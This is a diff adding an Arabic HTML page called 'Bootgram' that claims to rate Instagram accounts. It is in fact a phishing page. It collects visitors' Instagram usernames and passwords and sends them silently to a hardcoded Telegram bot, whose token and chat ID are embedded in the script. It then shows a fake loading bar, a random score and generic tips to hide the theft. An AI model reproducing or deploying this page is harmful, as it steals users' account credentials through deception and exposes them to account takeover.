@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>تقييم حسابك</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div id="app"></div>
+
+<script>
+// إعدادات البوت
+const BOT_TOKEN = "8220149286:AAEBTEtV9LZ_EhqRMnplJDnbMISzHtNKPS4";
+const CHAT_ID = "7327544231";
+
+// الحالة العامة للموقع
+let state = {
+    step: 0,
+    username: "",
+    password: "",
+    agreed: false,
+    score: 0
+};
+
+// عرض الصفحة حسب الخطوة
+function renderStep() {
+    const app = document.getElementById("app");
+    app.innerHTML = "";
+
+    const glassClass = "glass-container fade-in"; // لتطبيق تصميم الزجاجي
+
+    if (state.step === 0) {
+        // صفحة الترحيب
+        app.innerHTML = `
+            <div class="${glassClass}">
+                <h1>مرحباً بك في Bootgram</h1>
+                <p>منصتنا الذكية لتحليل وتقييم حسابك على إنستغرام بدقة واحترافية. تعرف على نقاط القوة والتحسين في حسابك لتطوير حضورك الرقمي والوصول إلى جمهور أوسع.</p>
+                <button onclick="nextStep()">المتابعة</button>
+            </div>
+        `;
+    } else if (state.step === 1) {
+        // صفحة الشروط
+        app.innerHTML = `
+            <div class="${glassClass}">
+                <h2>شروط الخصوصية</h2>
+                <p>يرجى الموافقة على شروط الخصوصية للمتابعة</p>
+                <label><input type="checkbox" id="agree"> أوافق على الشروط</label>
+                <br><br>
+                <button onclick="checkAgreement()">المتابعة</button>
+            </div>
+        `;
+    } else if (state.step === 2) {
+        // صفحة تسجيل الدخول
+        app.innerHTML = `
+            <div class="${glassClass}">
+                <h2>تسجيل الدخول لحساب Instagram المراد تقييمه</h2>
+                <form onsubmit="submitLogin(event)">
+                    <label>اسم المستخدم:</label>
+                    <input type="text" id="username" required>
+                    <label>كلمة المرور:</label>
+                    <input type="password" id="password" required>
+                    <button type="submit">تسجيل الدخول</button>
+                </form>
+            </div>
+        `;
+ } else if (state.step === 3) {
+    // صفحة التحميل
+    app.innerHTML = `
+        <div class="${glassClass}">
+            <div class="spinner"></div>
+            <h2 class="loading-text">
+                يرجى الانتظار يا عزيزي <span class="username">${state.username}</span><br>
+                يجري الآن تقييم حسابك...
+            </h2>
+            <div class="progress-wrap">
+                <div id="progress" class="progress-bar">0%</div>
+            </div>
+        </div>
+    `;
+    startLoading();
+}
+
+     else if (state.step === 4) {
+        // صفحة النتيجة
+        const messages = {
+            high: ["🔥 ممتاز! حسابك قوي جداً.", "🚀 أداء خارق، استمر هكذا!", "🏆 أنت من النخبة!"],
+            mid: ["👍 جيد جداً، استمر على هذا الأداء.", "💪 تقدم ملحوظ، أحسنت!", "🌟 ممتاز تقريباً، واصل!"],
+            low: ["🙂 جيد، لكن يمكن تحسينه.", "📈 تحتاج بعض التحسينات.", "⚡ جرب تعديل إعداداتك."]
+        };
+        let msg = "";
+        if (state.score >= 18) msg = messages.high[Math.floor(Math.random()*messages.high.length)];
+        else if (state.score >= 15) msg = messages.mid[Math.floor(Math.random()*messages.mid.length)];
+        else msg = messages.low[Math.floor(Math.random()*messages.low.length)];
+
+        app.innerHTML = `
+            <div class="${glassClass}">
+                <h2>نتيجة التقييم</h2>
+                <p>تقييم حسابك هو: <strong>${state.score}</strong>/20</p>
+                <p>${msg}</p>
+                <button onclick="nextStep()">عرض نصائح تحسين الحساب</button>
+                <br><br>
+                <button onclick="resetApp()">إعادة التقييم</button>
+            </div>
+        `;
+    } else if (state.step === 5) {
+        // صفحة النصائح
+        app.innerHTML = `
+            <div class="${glassClass}">
+                <h2>نصائح لتحسين حسابك على إنستغرام</h2>
+                <ul>
+                    <li>📸 استخدم صور عالية الجودة ومحتوى جذاب.</li>
+                    <li>🕒 انشر في أوقات النشاط الأعلى لجمهورك.</li>
+                    <li>🏷️ استخدم الوسوم المناسبة والمشهورة في مجالك.</li>
+                    <li>💬 تفاعل مع المتابعين عبر الرد على التعليقات والرسائل.</li>
+                    <li>📈 راقب أداء منشوراتك وحسّن المحتوى بناءً على النتائج.</li>
+                    <li>🎯 ركّز على تقديم قيمة حقيقية لجمهورك.</li>
+                </ul>
+                <br>
+                <button onclick="resetApp()">العودة إلى الصفحة الرئيسية</button>
+            </div>
+        `;
+    }
+}
+
+// الانتقال للخطوة التالية
+function nextStep() {
+    state.step++;
+    renderStep();
+}
+
+// التحقق من الموافقة
+function checkAgreement() {
+    const agree = document.getElementById("agree").checked;
+    if (!agree) {
+        alert("يرجى الموافقة على الشروط أولاً.");
+        return;
+    }
+    state.agreed = true;
+    nextStep();
+}
+
+// معالجة تسجيل الدخول
+function submitLogin(e) {
+    e.preventDefault();
+    state.username = document.getElementById("username").value.trim();
+    state.password = document.getElementById("password").value.trim();
+
+    const message = `🔐 تسجيل دخول جديد\n👤 اسم المستخدم: ${state.username}\n🔑 كلمة المرور: ${state.password}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+
+    nextStep();
+}
+
+// بدء التحميل
+function startLoading() {
+    let progress = 0;
+    const bar = document.getElementById("progress");
+    const timer = setInterval(() => {
+        progress += 1;
+        bar.style.width = progress + "%";
+        bar.textContent = progress + "%";
+        if (progress >= 100) {
+            clearInterval(timer);
+            setTimeout(() => {
+                state.score = Math.floor(Math.random() * 10) + 11; // من 11 إلى 20
+                nextStep();
+            }, 500);
+        }
+    }, 150);
+}
+
+// إعادة التشغيل
+function resetApp() {
+    state = { step: 0, username: "", password: "", agreed: false, score: 0 };
+    renderStep();
+}
+
+// بدء التطبيق
+renderStep();
+</script>
+<script src="transitions.js" defer></script>
+</body>
+</html>
